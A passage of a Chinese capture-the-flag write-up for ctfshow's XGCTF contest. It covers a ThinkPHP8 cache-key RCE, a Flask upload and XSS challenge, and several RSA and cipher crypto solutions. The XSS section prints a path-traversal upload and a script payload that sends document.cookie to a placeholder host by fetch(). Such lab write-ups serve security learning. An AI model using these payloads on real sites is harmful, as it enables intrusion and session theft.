src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_1.png"></p><p>源码只给了 index.php，猜测是框架本身的洞，网上找不到关于 <code>thinkphp8</code> 的洞。</p><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$middleware</span> = [<span class="string">&#x27;think\middleware\AllowCrossDomain&#x27;</span>,<span class="string">&#x27;think\middleware\CheckRequestCache&#x27;</span>,<span class="string">&#x27;think\middleware\LoadLangPack&#x27;</span>,<span class="string">&#x27;think\middleware\SessionInit&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$isCache</span> = <span class="literal">false</span> , <span class="variable">$cacheTime</span> = <span class="number">3600</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$isCache</span> == <span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="variable">$config</span> = <span class="keyword">require</span>  <span class="keyword">__DIR__</span>.<span class="string">&#x27;/../../config/route.php&#x27;</span>;</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;request_cache_key&#x27;</span>] = <span class="variable">$isCache</span>;</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;request_cache_expire&#x27;</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$cacheTime</span>);</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;request_cache_except&#x27;</span>] = [];</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../../config/route.php&#x27;</span>, <span class="string">&#x27;&lt;?php return &#x27;</span>. <span class="title function_ invoke__">var_export</span>(<span class="variable">$config</span>, <span class="literal">true</span>). <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;cache is enabled&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Welcome ,cache is disabled&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析源码，在 <code>index</code>路由，有一个 <code>require  __DIR__.&#39;/../../config/route.php&#39;</code> 操作，同时后边还会对<code>config/route.php</code>修改，猜测和<code>config/route.php</code>文件有关。可控的值是<code>$config[&#39;request_cache_key&#39;]</code>。</p><p>先全局搜关键字 <code>request_cache_key</code> ，可以在 <code>vendor/topthink/framework/src/think/middleware/CheckRequestCache.php</code>里发现关键字。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_2.png"></p><p>然后打个断点调试，接着单步调试。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_3.png"></p><p>跟进 <code>parseCacheKey</code>，可以看到这里的 <code>elseif</code>  以 <code>|</code> 为分割得到 <code>$key</code> 和 <code>$fun</code>。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_4.png"></p><p>接着在下边动态执行函数。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_5.png"></p><p>去<code>route.php</code>修改<code>request_cache_key</code>的值，再次调试看能不能符合条件。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_6.png"></p><p>再次调试到该位置，发现能进入 <code>elseif</code>，并成功给  <code>$key</code> 和 <code>$fun</code>赋值。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_7.png"></p><p>之后就走到 <code>$key = $fun($key);</code> ，成功执行函数。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_8.png"></p><p>至此，调试结束，接下来是利用。</p><p>根据 thinkphp 的路由规则，访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里，然后传递参数<code>isCache</code>和<code>cacheTime</code>。</p><p>然后在 <code>isCache</code>里输入命令，设置<code>cacheTime</code> 为1秒，让cache生效快点，多访问几次，成功RCE。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_3_9.png"></p><h2 id="NewerFileDetector"><a href="#NewerFileDetector" class="headerlink" title="NewerFileDetector"></a>NewerFileDetector</h2><p>源码：</p><p>app.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,session</span><br><span class="line"><span class="keyword">import</span> magika</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> bot <span class="keyword">import</span> visit <span class="keyword">as</span> bot_visit</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">app.static_folder = <span class="string">&#x27;public/&#x27;</span></span><br><span class="line">vip_user = <span class="string">&quot;vip&quot;</span></span><br><span class="line">vip_pwd = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">curr_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">CHECK_FOLDER = os.path.join(curr_dir,<span class="string">&quot;check&quot;</span>)</span><br><span class="line">USER_FOLDER = os.path.join(curr_dir,<span class="string">&quot;public/user&quot;</span>)</span><br><span class="line">mg = magika.Magika()    <span class="comment">#深度学习</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isSecure</span>(<span class="params">file_type</span>):</span><br><span class="line">    D_extns = [<span class="string">&quot;json&quot;</span>,<span class="string">&#x27;py&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>, <span class="string">&quot;html&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> file_type <span class="keyword">in</span> D_extns:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;isSVIP&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;logined&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;input your username and password plz&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user = request.form.get(<span class="string">&quot;username&quot;</span>).strip()</span><br><span class="line">            pwd = request.form.get(<span class="string">&quot;password&quot;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> user == vip_user <span class="keyword">and</span> pwd == vip_pwd:</span><br><span class="line">                session[<span class="string">&quot;isSVIP&quot;</span>] = <span class="string">&quot;True&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                session[<span class="string">&quot;isSVIP&quot;</span>] = <span class="string">&quot;False&quot;</span></span><br><span class="line">            <span class="comment"># 写入硬盘中，方便bot验证。</span></span><br><span class="line">            file = os.path.join(CHECK_FOLDER,<span class="string">&quot;vip.json&quot;</span>) </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                json.dump(&#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> session.items()&#125;,f)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;user&#125;</span> login success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you broke the server,get out!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>,methods = [<span class="string">&quot;POST&quot;</span>]</span>)      </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():   </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = request.form.get(<span class="string">&quot;content&quot;</span>).strip()</span><br><span class="line">        name = request.form.get(<span class="string">&quot;name&quot;</span>).strip()</span><br><span class="line">        file_type = mg.identify_bytes(content.encode()).output.ct_label <span class="comment">#判断文件内容</span></span><br><span class="line">        <span class="keyword">if</span> isSecure(file_type):</span><br><span class="line">            file = os.path.join(USER_FOLDER,name) </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(content)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok,share your link to bot: /visit?link=user/&quot;</span>+ name</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;black!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;you broke the server,fuck out!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/visit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    link = request.args.get(<span class="string">&quot;link&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> bot_visit(link)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/share&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">share</span>():</span><br><span class="line">    file = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(file)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/clear&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;session clear success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/check&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">path = os.path.join(CHECK_FOLDER,<span class="string">&quot;vip.json&quot;</span>)             <span class="comment">#join</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">content = <span class="built_in">open</span>(path,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">isSVIP = ast.literal_eval(json.loads(content)[<span class="string">&quot;isSVIP&quot;</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">isSVIP = <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;VIP&quot;</span> <span class="keyword">if</span> isSVIP <span class="keyword">else</span> <span class="string">&quot;GUEST&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;GUEST&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">5050</span>)</span><br></pre></td></tr></table></figure><p>bot.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># bot nodejs puppter selenium</span></span><br><span class="line">flag = os.getenv(<span class="string">&quot;flag&quot;</span>) <span class="keyword">if</span> os.getenv(<span class="string">&quot;flag&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">option = webdriver.ChromeOptions()</span><br><span class="line">option.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">option.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">option.add_argument(<span class="string">&#x27;--disable-logging&#x27;</span>)</span><br><span class="line">option.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome(options=option)</span><br><span class="line">cookie = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: flag, <span class="string">&#x27;domain&#x27;</span>:<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;httpOnly&#x27;</span>: <span class="literal">False</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">link</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">browser.get(<span class="string">&quot;http://localhost:5050/check&quot;</span>) <span class="comment">#检测是否为vip</span></span><br><span class="line">browser.add_cookie(cookie)</span><br><span class="line">page_source = browser.page_source</span><br><span class="line"><span class="built_in">print</span>(page_source)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;VIP&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> page_source:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;NONONO&quot;</span> <span class="comment"># pass</span></span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">url = <span class="string">&quot;http://localhost:5050/share?file=&quot;</span> + link</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Get out!&quot;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.quit()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;you broke the server,get out!&quot;</span></span><br></pre></td></tr></table></figure><p>分析源码，可以知道这是一个xss的题，bot的逻辑很简单，当检查是vip时，即可把 flag 放在 cookie 里并访问 <code>http://localhost:5050/share?file=xxx</code></p><p>分析<code>app.py</code>，<code>/upload</code>路由可以任意上传文件，<code>/check</code>路由通过读取 <code>vip.json</code>来检查是否为vip。</p><p>那么题目的思路就是先上传一个 <code>vip.json</code>来覆盖掉旧的<code>vip.sjon</code>，从而通过<code>/check</code>，接着再上传一个html，实现xss。</p><p>测试可以发现，直接写一个js的代码不会被识别成html，重点是 json 识别的绕过。</p><p>html</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_1.png"></p><p>对 <code>magika</code> 进行代码审计，跟进  <code>identify_bytes -&gt; _get_result_from_bytes -&gt; _get_result_or_features_from_bytes</code></p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_2.png"></p><p>可以发现对文本内容进行了长度判断。接着跟进 <code>_get_result_of_few_bytes -&gt; _get_ct_label_of_few_bytes</code>，可以看到是直接返回了文本内容。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_3.png"></p><p>接着查找长度，跟进 <code>_min_file_size_for_dl</code> ，最终发现它的值是从文件里读取的。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_4.png"></p><p>去找这个文件看看。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_5.png"></p><p>可以得到 <code>_min_file_size_for_dl</code> 的值是 16 ，也就是说，只要我们文本的内容长度少于16，就不会对文件进行检测。</p><p>在<code>/check</code>路由中，对vip的判断是<code>&quot;VIP&quot; if isSVIP else &quot;GUEST&quot;</code>，只要 <code>isSVIP</code>不为空或者不是 <code>False</code>，即可通过判断。</p><p>那么接下来上传的内容可以这么写，可以绕过长度限制：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;isSVIP&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><p>没有过滤 <code>..</code> ，可以用相对路径跳回根目录再接着往下写。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../app/check/vip.json</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">name=../../../../app/check/vip.json&amp;content=&#123;&quot;isSVIP&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><p>访问 <code>/ckeck</code>，已经成为 vip 了。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_6.png"></p><p>最后就是xss了，上传一个简单的 html ，然后让 bot 访问就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">name=1.html&amp;content=&lt;script&gt;fetch(&quot;http://[ip:port]/?flag=&quot;%2bdocument.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问 <code>/visit?link=user/1.html</code></p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_4_7.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="奇怪的条形码"><a href="#奇怪的条形码" class="headerlink" title="奇怪的条形码"></a>奇怪的条形码</h2><p>找个工具把图片弄扁一点就能清晰地看到图上的内容了。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/c_1_1.png"></p><p>base64解码得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y3Rmc2hvd3t4aWd1YmVpX21pc2NfZ3JhbV9oZXJlX2ZsYWd9</span><br><span class="line"></span><br><span class="line">ctfshow&#123;xigubei_misc_gram_here_flag&#125;</span><br></pre></td></tr></table></figure><h2 id="简单密码"><a href="#简单密码" class="headerlink" title="简单密码"></a>简单密码</h2><p>密文：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><p>猜测flag头是<code>ctfshow&#123;</code>，把它转成16进制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">63746673686f777b</span><br></pre></td></tr></table></figure><p>对比密文可以发现是变种凯撒，写脚本还原。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">&quot;647669776d757e83817372816e707479707c888789757c92788d84838b878d9d&quot;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">tmp = enc[i]-i-<span class="number">1</span></span><br><span class="line">flag += <span class="built_in">chr</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># ctfshow&#123;xiguabei_just_ez_signin&#125;</span></span><br></pre></td></tr></table></figure><h2 id="factor"><a href="#factor" class="headerlink" title="factor"></a>factor</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">36</span>)</span><br><span class="line">tmp = bytes_to_long(hint)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">400</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = gmpy2.invert(d,phi)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1 = p^tmp</span><br><span class="line">leak2 = q^tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak1 = <span class="subst">&#123;leak1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak2 = <span class="subst">&#123;leak2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span></span><br><span class="line"><span class="string">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span></span><br><span class="line"><span class="string">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span></span><br><span class="line"><span class="string">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span></span><br><span class="line"><span class="string">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>观察可知，<code>leak1 ^ leak2 == p ^ q</code>，由这个条件，可以用 <code>dfs</code> 爆破出p和q，爆破的时候剪枝加速。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span></span><br><span class="line">e = <span class="number">10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span></span><br><span class="line">c = <span class="number">60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span></span><br><span class="line">leak1 = <span class="number">13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span></span><br><span class="line">leak2 = <span class="number">10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span></span><br><span class="line">leak = leak1 ^ leak2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1 = <span class="string">&quot;00&quot;</span> + <span class="built_in">str</span>(<span class="built_in">bin</span>(leak)[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">l = <span class="built_in">len</span>(p)</span><br><span class="line">tmp0 = p + (<span class="number">512</span>-l)*<span class="string">&quot;0&quot;</span></span><br><span class="line">tmp1 = p + (<span class="number">512</span>-l)*<span class="string">&quot;1&quot;</span></span><br><span class="line">tmq0 = q + (<span class="number">512</span>-l)*<span class="string">&quot;0&quot;</span></span><br><span class="line">tmq1 = q + (<span class="number">512</span>-l)*<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">int</span>(tmp0,<span class="number">2</span>) &lt; <span class="built_in">int</span>(tmq0,<span class="number">2</span>)):</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">int</span>(tmp0,<span class="number">2</span>)*<span class="built_in">int</span>(tmq0,<span class="number">2</span>) &gt; n):</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">int</span>(tmp1,<span class="number">2</span>)*<span class="built_in">int</span>(tmq1,<span class="number">2</span>) &lt; n):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> l == <span class="number">512</span>:</span><br><span class="line"><span class="keyword">if</span> n%<span class="built_in">int</span>(p,<span class="number">2</span>)==<span class="number">0</span>:</span><br><span class="line">pp = <span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">qq = <span class="built_in">int</span>(q,<span class="number">2</span>)</span><br><span class="line">d = gmpy2.invert(e, (pp - <span class="number">1</span>) * (qq - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span>(a1[l] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">find(p+<span class="string">&quot;1&quot;</span>,q+<span class="string">&quot;0&quot;</span>)</span><br><span class="line">find(p+<span class="string">&quot;0&quot;</span>,q+<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">find(p+<span class="string">&quot;0&quot;</span>,q+<span class="string">&quot;0&quot;</span>)</span><br><span class="line">find(p+<span class="string">&quot;1&quot;</span>,q+<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tempp = <span class="string">&quot;&quot;</span></span><br><span class="line">tempq = <span class="string">&quot;&quot;</span></span><br><span class="line">find(tempp,tempq)</span><br><span class="line"><span class="comment"># b&#x27;cftshow&#123;do_you_know_what_is_xor_and_prune!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="给你d又怎样"><a href="#给你d又怎样" class="headerlink" title="给你d又怎样"></a>给你d又怎样</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;***&#125;&quot;</span></span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=invert(e,phin)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint=&quot;</span>,<span 